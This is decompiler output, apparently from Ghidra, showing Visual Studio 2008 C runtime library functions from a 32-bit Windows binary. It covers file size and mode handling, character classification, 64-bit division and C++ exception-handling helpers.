int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_004167f4;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_004167f4;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_004167f4;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_004168f2;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_004167f4;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_00416846;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_00416846:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_004168f2:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_004167f4;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_004167f4:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int iVar1;
  int *piVar2;
  char cVar3;
  byte bVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar2 = &DAT_004257a0 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar1 = *piVar2 + iVar7;
  cVar3 = *(char *)(iVar1 + 0x24);
  bVar4 = *(byte *)(iVar1 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_004169c0;
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_004169c0:
  if ((bVar4 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar3 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_PMode = DAT_00424558;
    eVar2 = 0;
  }
  return eVar2;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2008 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  _PHNDLR p_Var2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if ((DAT_00422f10 & 1) != 0) {
    __NMSG_WRITE(10);
  }
  p_Var2 = ___get_sigabrt();
  if (p_Var2 != (_PHNDLR)0x0) {
    _raise(0x16);
  }
  if ((DAT_00422f10 & 2) != 0) {
    local_2d4 = 0x10001;
    _memset(&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_004241c8 == 0) {
    return *(ushort *)(PTR_DAT_00422d80 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2008 Release

void __cdecl ___initconout(void)

{
  DAT_00422f18 = CreateFileA(s_CONOUT__0041d50c,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  __flswbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flswbuf(int _Ch,FILE *_File)

{
  uint uVar1;
  char *_Buf;
  char *pcVar2;
  uint _FileHandle;
  int *piVar3;
  undefined **ppuVar4;
  int iVar5;
  undefined *puVar6;
  int unaff_EDI;
  uint _MaxCharCount;
  longlong lVar7;
  undefined4 local_8;
  
  _FileHandle = __fileno(_File);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
LAB_00416c28:
    _File->_flag = _File->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar3 = __errno();
    *piVar3 = 0x22;
    goto LAB_00416c28;
  }
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_cnt = 0;
  local_8 = 0;
  _MaxCharCount = 2;
  _File->_flag = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar4 = FUN_0040d3ff(), _File != (FILE *)(ppuVar4 + 8) &&
       (ppuVar4 = FUN_0040d3ff(), _File != (FILE *)(ppuVar4 + 0x10))) ||
      (iVar5 = __isatty(_FileHandle), iVar5 == 0)))) {
    __getbuf(_File);
  }
  if ((_File->_flag & 0x108U) == 0) {
    local_8 = CONCAT22(local_8._2_2_,(short)_Ch);
    local_8 = __write(_FileHandle,&local_8,2);
  }
  else {
    _Buf = _File->_base;
    pcVar2 = _File->_ptr;
    _File->_ptr = _Buf + 2;
    _MaxCharCount = (int)pcVar2 - (int)_Buf;
    _File->_cnt = _File->_bufsiz + -2;
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar6 = &DAT_00422448;
      }
      else {
        puVar6 = (undefined *)((_FileHandle & 0x1f) * 0x40 + (&DAT_004257a0)[(int)_FileHandle >> 5])
        ;
      }
      if (((puVar6[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64(_FileHandle,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00416d5f;
    }
    else {
      local_8 = __write(_FileHandle,_Buf,_MaxCharCount);
    }
    *(short *)_File->_base = (short)_Ch;
  }
  if (local_8 == _MaxCharCount) {
    return _Ch & 0xffff;
  }
LAB_00416d5f:
  _File->_flag = _File->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  ___ansicp
// 
// Library: Visual Studio 2008 Release

void __cdecl ___ansicp(LCID param_1)

{
  int iVar1;
  CHAR local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,local_10,6);
  if (iVar1 != 0) {
    _atol(local_10);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___convertcp
// 
// Library: Visual Studio 2008 Release

void __cdecl
___convertcp(UINT param_1,UINT param_2,char *param_3,uint *param_4,LPSTR param_5,int param_6)

{
  uint _Size;
  uint cbMultiByte;
  bool bVar1;
  BOOL BVar2;
  size_t sVar3;
  undefined4 *puVar4;
  int iVar5;
  LPSTR lpMultiByteStr;
  uint uVar6;
  bool bVar7;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_4;
  bVar1 = false;
  if (param_1 == param_2) goto LAB_00416f61;
  BVar2 = GetCPInfo(param_1,&local_1c);
  if ((((BVar2 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar2 = GetCPInfo(param_2,&local_1c), BVar2 == 0)) || (local_1c.MaxCharSize != 1)) {
    uVar6 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = uVar6 == 0;
    if (bVar7) goto LAB_00416f61;
  }
  else {
    bVar1 = true;
    uVar6 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      sVar3 = _strlen(param_3);
      uVar6 = sVar3 + 1;
    }
    bVar7 = uVar6 == 0;
  }
  if ((bVar7 || (int)uVar6 < 0) || (0x7ffffff0 < uVar6)) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    _Size = uVar6 * 2 + 8;
    if (_Size < 0x401) {
      puVar4 = (undefined4 *)&stack0xffffffbc;
      local_20 = (undefined4 *)&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_00416ea1:
        local_20 = puVar4 + 2;
      }
    }
    else {
      puVar4 = (undefined4 *)_malloc(_Size);
      local_20 = puVar4;
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = 0xdddd;
        goto LAB_00416ea1;
      }
    }
  }
  if (local_20 != (undefined4 *)0x0) {
    _memset(local_20,0,uVar6 * 2);
    iVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)local_20,uVar6);
    if (iVar5 != 0) {
      if (param_5 == (LPSTR)0x0) {
        if (((bVar1) ||
            (uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,(LPSTR)0x0,0,(LPCSTR)0x0,
                                         (LPBOOL)0x0), uVar6 != 0)) &&
           (lpMultiByteStr = (LPSTR)__calloc_crt(1,uVar6), lpMultiByteStr != (LPSTR)0x0)) {
          uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,lpMultiByteStr,uVar6,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (uVar6 == 0) {
            _free(lpMultiByteStr);
          }
          else if (cbMultiByte != 0xffffffff) {
            *param_4 = uVar6;
          }
        }
      }
      else {
        WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,param_5,param_6,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    __freea(local_20);
  }
LAB_00416f61:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2008 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_004170a2:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_004170a2;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2008 Release

int __cdecl _tolower(int _C)

{
  if (DAT_004241c8 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_004171e1;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_004171e1:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x004172ce. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



void FUN_0041738a(void)

{
  return;
}



// Library Function - Single Match
//  __cfltcvt_init
// 
// Library: Visual Studio 2008 Release

void __cfltcvt_init(void)

{
  PTR_LAB_00422dd0 = __cfltcvt;
  PTR_LAB_00422dd4 = __cropzeros;
  PTR_LAB_00422dd8 = __fassign;
  PTR_LAB_00422ddc = __forcdecpt;
  PTR_LAB_00422de0 = __positive;
  PTR_LAB_00422de4 = __cfltcvt;
  PTR_LAB_00422de8 = __cfltcvt_l;
  PTR_LAB_00422dec = __fassign_l;
  PTR_LAB_00422df0 = __cropzeros_l;
  PTR_LAB_00422df4 = __forcdecpt_l;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __fpmath
// 
// Library: Visual Studio 2008 Release

void __cdecl __fpmath(int param_1)

{
  __cfltcvt_init();
  _DAT_0042574c = __ms_p5_mp_test_fdiv();
  if (param_1 != 0) {
    __setdefaultprecision();
  }
  return;
}



ulonglong __fastcall FUN_00417410(undefined4 param_1,undefined4 param_2)

{
  ulonglong uVar1;
  uint uVar2;
  float fVar3;
  float10 in_ST0;
  uint local_20;
  float fStack_1c;
  
  if (DAT_004268c4 == 0) {
    uVar1 = (ulonglong)ROUND(in_ST0);
    local_20 = (uint)uVar1;
    fStack_1c = (float)(uVar1 >> 0x20);
    fVar3 = (float)in_ST0;
    if ((local_20 != 0) || (fVar3 = fStack_1c, (uVar1 & 0x7fffffff00000000) != 0)) {
      if ((int)fVar3 < 0) {
        uVar1 = uVar1 + (0x80000000 < ((uint)(float)(in_ST0 - (float10)uVar1) ^ 0x80000000));
      }
      else {
        uVar2 = (uint)(0x80000000 < (uint)(float)(in_ST0 - (float10)uVar1));
        uVar1 = CONCAT44((int)fStack_1c - (uint)(local_20 < uVar2),local_20 - uVar2);
      }
    }
    return uVar1;
  }
  return CONCAT44(param_2,(int)in_ST0);
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
                    // WARNING: Load size is inaccurate
  ExceptionList = *ExceptionList;
                    // WARNING: Could not recover jumptable at 0x004174e6. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
  LOCK();
  UNLOCK();
                    // WARNING: Could not recover jumptable at 0x004174f2. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2008 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x41751f,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  _s_FuncInfo *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x41765c;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_00422044 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)ExceptionList;
    ExceptionList = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 != 0) {
                    // WARNING: Load size is inaccurate
      *local_2c = *ExceptionList;
    }
    ExceptionList = local_2c;
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
